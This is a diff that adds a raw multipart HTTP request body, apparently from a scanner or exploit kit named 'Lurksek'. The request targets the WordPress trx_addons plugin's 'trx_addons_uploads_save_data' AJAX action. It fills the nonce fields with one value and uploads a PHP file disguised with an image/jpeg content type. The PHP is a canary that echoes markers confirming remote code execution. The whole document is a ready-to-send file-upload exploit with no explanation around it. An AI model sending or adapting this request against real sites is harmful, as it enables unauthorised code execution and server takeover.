@@ -1,0 +1,26 @@
+------WebKitFormBoundaryLurksekRce7
+Content-Disposition: form-data; name="action"
+
+trx_addons_uploads_save_data
+------WebKitFormBoundaryLurksekRce7
+Content-Disposition: form-data; name="nonce"
+
+08bbf42fbe
+------WebKitFormBoundaryLurksekRce7
+Content-Disposition: form-data; name="_wpnonce"
+
+08bbf42fbe
+------WebKitFormBoundaryLurksekRce7
+Content-Disposition: form-data; name="security"
+
+08bbf42fbe
+------WebKitFormBoundaryLurksekRce7
+Content-Disposition: form-data; name="trx_addons_ajax_nonce"
+
+08bbf42fbe
+------WebKitFormBoundaryLurksekRce7
+Content-Disposition: form-data; name="trx_addons_uploads_file"; filename="lurksek_canary.php"
+Content-Type: image/jpeg
+
+<?php echo 'LURKSEK_RCE_OK'; echo PHP_EOL; echo 'lurksek_rce_20260826145000';
+------WebKitFormBoundaryLurksekRce7--
